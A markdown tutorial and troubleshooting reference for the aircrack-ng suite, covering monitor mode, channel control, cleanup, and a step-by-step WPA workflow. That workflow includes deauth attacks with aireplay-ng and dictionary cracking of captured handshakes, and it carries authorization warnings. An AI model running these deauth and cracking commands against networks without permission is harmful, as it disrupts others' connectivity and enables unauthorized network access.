# Airmon-ng & the Aircrack-ng Suite — Field Reference

A practical, no-fluff reference for setting up monitor mode, capturing traffic, hopping/locking channels, and cleaning up afterward — plus the errors you will actually hit and how to fix them.

> **Scope note:** This is for testing hardware/networks you own or are explicitly authorized to test. Airmon-ng and friends can disrupt wireless traffic for everyone in range (deauth especially) — that's illegal against networks you don't control.

---

## 1. What's actually in the suite

`airmon-ng` doesn't work alone — it's the first step in a pipeline:

| Tool | Job |
|---|---|
| `airmon-ng` | Enable/disable monitor mode, kill interfering processes, list interfaces |
| `airodump-ng` | Passively capture packets, show nearby APs/clients, dump to file |
| `aireplay-ng` | Inject traffic — deauth, fake auth, ARP replay, etc. |
| `aircrack-ng` | Crack WEP keys or WPA/WPA2 handshakes against a wordlist |
| `airdecap-ng` | Decrypt captured traffic once you have the key |
| `airbase-ng` | Turn your card into a fake AP |

They all read/write the same `.cap`/`.csv` files, so the workflow chains naturally: `airmon-ng` → `airodump-ng` → `aireplay-ng` (if needed) → `aircrack-ng`.

---

## 2. Prerequisites

- A wireless adapter that supports **monitor mode** and **packet injection**. Built-in laptop cards often don't — check chipset compatibility (Atheros, Ralink RT3070/RT5370, and the classic Alfa AWUS036 series are safe bets).
- Root or sudo.
- Installed: `sudo apt install aircrack-ng` (already present on most Kali installs).

Check your card is recognized:

```bash
iw dev
# or
airmon-ng
```

Running `airmon-ng` with no arguments lists your wireless interfaces, their driver, and chipset:

```
PHY     Interface       Driver          Chipset
phy0    wlan0           ath9k_htc       Qualcomm Atheros AR9271
```

If nothing shows up, the adapter isn't detected at the kernel level yet — this is a hardware/driver problem, not an airmon-ng problem (see Troubleshooting §7.1).

---

## 3. Setting up monitor mode

### 3.1 Kill interfering processes first

Before starting monitor mode, kill anything that might grab the interface back (NetworkManager, wpa_supplicant, dhclient):

```bash
sudo airmon-ng check
```

This lists PIDs that "may cause trouble." Then:

```bash
sudo airmon-ng check kill
```

This kills NetworkManager and wpa_supplicant for you. **Note:** this drops your normal Wi-Fi/internet connection on that machine until you restart NetworkManager later (§5.2). If you need internet during the test (e.g., via Ethernet or a second adapter), make sure that's already up before you kill anything.

### 3.2 Start monitor mode

```bash
sudo airmon-ng start wlan0
```

Output looks like:

```
PHY     Interface       Driver          Chipset
phy0    wlan0           ath9k_htc       Qualcomm Atheros AR9271

                (monitor mode enabled on wlan0mon)
```

Note the new interface name — on most drivers it becomes `wlan0mon`, but on some (especially with recent driver/airmon-ng versions) it stays `wlan0` and just flips into monitor type. **Always check the actual interface name it reports back**, don't assume.

Verify with:

```bash
iwconfig
```

You should see `Mode:Monitor` next to the interface.

### 3.3 Optional: fix your channel while starting

You can pin the interface to a specific channel right from the start:

```bash
sudo airmon-ng start wlan0 6
```

This sets monitor mode on wlan0 and locks the working channel to 6. Useful when you already know your target AP's channel and don't want airodump hopping around.

---

## 4. Working with channels

### 4.1 Default behavior: channel hopping

Once in monitor mode, `airodump-ng` by default **hops across all channels** in the current regulatory domain (usually 1–11 for 2.4GHz in most regions, more if 5GHz-capable and unlocked). This is good for a broad recon scan but bad if you're trying to capture a full handshake or a lot of clean data from one AP, since you only get spurts of it per hop cycle.

### 4.2 Locking to a single channel

Two ways:

**A. Set it on the monitor interface directly with `iwconfig` (or `iw`):**

```bash
sudo iwconfig wlan0mon channel 6
```

**B. Let `airodump-ng` do it when you target one AP:**

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon
```

Passing `--channel` (or `-c`) stops the hopping and parks the card on that channel for the whole session — this is what you want once you've identified your target from a broad scan.

### 4.3 Switching channels mid-session

You generally don't switch channels while a capture is actively targeting an AP — you stop, adjust, restart. If you do want to nudge it manually:

```bash
sudo iwconfig wlan0mon channel 11
```

Do this in a separate terminal if `airodump-ng` is already running; it'll pick up wherever the card currently sits.

### 4.4 2.4GHz vs 5GHz

By default, most cards/airodump only scan 2.4GHz (channels 1–14 depending on region). To include 5GHz:

```bash
sudo airodump-ng --band abg wlan0mon
```

(`a` = 5GHz, `b`/`g` = 2.4GHz legacy, add all three to catch everything your card supports.)

---

## 5. Shutting down / restoring normal networking

This is the step people forget, and then wonder why Wi-Fi is broken afterward.

### 5.1 Stop monitor mode

```bash
sudo airmon-ng stop wlan0mon
```

This reverts the interface back to managed mode (name usually reverts to `wlan0` too, driver-dependent).

### 5.2 Restart the services you killed

```bash
sudo systemctl restart NetworkManager
```

or, on non-systemd setups:

```bash
sudo service network-manager restart
```

If `wpa_supplicant` was killed and doesn't come back with NetworkManager, restart it too:

```bash
sudo systemctl restart wpa_supplicant
```

### 5.3 Sanity check

```bash
iwconfig
nmcli device status
```

Confirm the interface shows `Mode:Managed` and NetworkManager sees it as connected/available again.

---

## 6. A typical full workflow (recon → capture → crack)

```bash
# 1. Kill interfering processes
sudo airmon-ng check kill

# 2. Start monitor mode
sudo airmon-ng start wlan0

# 3. Broad recon — find your target
sudo airodump-ng wlan0mon
# note down BSSID and channel of your target AP, then Ctrl+C

# 4. Targeted capture, locked to that channel, writing to file
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

# 5. (If needed, in another terminal) force a handshake with a deauth
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 6. Once airodump shows "WPA handshake: AA:BB:CC:DD:EE:FF" in the top right, stop it (Ctrl+C)

# 7. Crack against a wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# 8. Clean up
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## 7. Troubleshooting

### 7.1 "No such device" / adapter not listed by `airmon-ng`

- Run `lsusb` (USB adapters) or `lspci` (internal cards) — is it detected at all?
- Check `dmesg | tail -30` right after plugging in — look for driver load errors.
- Some chipsets need a driver installed manually (e.g., Realtek RTL8812AU isn't in-kernel on many distros) — you'll need the vendor/community driver from GitHub, built with DKMS.
- VM users: if running Kali in VirtualBox/VMware, make sure the USB adapter is actually passed through to the VM (Devices → USB → select it), not just attached to the host.

### 7.2 Monitor mode starts but "Found X process(es) that could cause trouble" keeps reappearing

Some distros restart NetworkManager automatically or have a script rebinding wpa_supplicant. Kill and immediately start monitor mode back-to-back:

```bash
sudo airmon-ng check kill && sudo airmon-ng start wlan0
```

If it's persistent, disable NetworkManager's control of that interface entirely by adding it to `/etc/NetworkManager/NetworkManager.conf` under `[keyfile] unmanaged-devices=interface-name:wlan0`.

### 7.3 "Fixed channel wlan0mon: -1" in airodump-ng output

This almost always means monitor mode isn't actually active, or the driver is fighting you. Fixes:

- Re-run `sudo airmon-ng check kill` then restart monitor mode.
- Try `sudo ip link set wlan0mon down`, then `sudo iw wlan0mon set monitor none`, then `sudo ip link set wlan0mon up` manually — bypasses airmon-ng's automation if it's misfiring on your driver.
- Some drivers (notably certain rtl8xxx forks) are just flaky with airmon-ng's channel-setting; use `iwconfig`/`iw` directly instead of airodump's own hopping.

### 7.4 Interface name confusion (wlan0 vs wlan0mon vs wlan0 staying wlan0)

Newer airmon-ng versions on some driver/kernel combos **don't rename the interface** — it stays `wlan0` but switches type to monitor. Always re-check with `iwconfig` or `iw dev` after starting, don't hardcode `wlan0mon` in your commands blindly.

### 7.5 `aireplay-ng` says "no such BSSID available" or injection fails

- Confirm you're actually on the AP's channel (`iwconfig wlan0mon` should show it).
- Run an injection test first:
  ```bash
  sudo aireplay-ng -9 wlan0mon
  ```
  If injection fails here, it's a hardware/driver limitation — not every card that does monitor mode also does injection.
- Distance/signal strength matters more than people expect; deauth packets need to actually reach the client and AP.

### 7.6 Never seeing a WPA handshake despite deauth

- Make sure a client is actually connected and reconnecting — deauth only forces a *re*-handshake, it can't create one from nothing.
- Check you're capturing on the right channel the whole time (`--channel` locked, not hopping).
- Try increasing deauth count (`--deauth 10` instead of the default single burst) or target the specific client MAC with `-c`:
  ```bash
  sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
  ```

### 7.7 `aircrack-ng` runs forever / never finds the key

- Confirm the `.cap` actually contains a full 4-way handshake — airodump-ng shows "WPA handshake:" in its top-right corner only when it caught one; otherwise you're cracking against nothing.
- Wordlist matters more than compute — rockyou.txt won't crack a strong random passphrase. This is a wordlist coverage problem, not a tool bug.
- Speed up with GPU-based tools (`hashcat`) instead if you're stuck on CPU-only `aircrack-ng` for a large wordlist — convert the `.cap` to hashcat format with `hcxpcapngtool`.

### 7.8 Wi-Fi doesn't come back after `airmon-ng stop`

- Restart NetworkManager (§5.2) — this is the #1 forgotten step.
- If it's still not reconnecting, check `rfkill list` — sometimes the card ends up soft-blocked:
  ```bash
  sudo rfkill unblock wifi
  ```
- Worst case, reboot — driver state occasionally gets stuck across mode switches on flaky chipsets.

### 7.9 Permission denied on any of these commands

You need root for all of the above — `sudo` everything, or work as root directly. Airmon-ng/airodump-ng/aireplay-ng all touch raw sockets and interface state, which is root-only by design.

---

## 8. Quick command cheat-sheet

```bash
airmon-ng                                  # list interfaces
airmon-ng check kill                       # kill interfering processes
airmon-ng start <iface> [channel]          # start monitor mode, optionally lock channel
airmon-ng stop <mon-iface>                 # stop monitor mode
iwconfig <mon-iface> channel <n>           # manually set channel
airodump-ng <mon-iface>                    # broad scan, all channels
airodump-ng --bssid <BSSID> -c <ch> -w <file> <mon-iface>   # targeted capture
aireplay-ng --deauth <n> -a <BSSID> <mon-iface>             # deauth attack
aireplay-ng -9 <mon-iface>                 # injection test
aircrack-ng -w <wordlist> -b <BSSID> <capfile.cap>          # crack handshake
```

---

*Reference only — always confirm you have written authorization before running any of this against a network or device you don't own.*
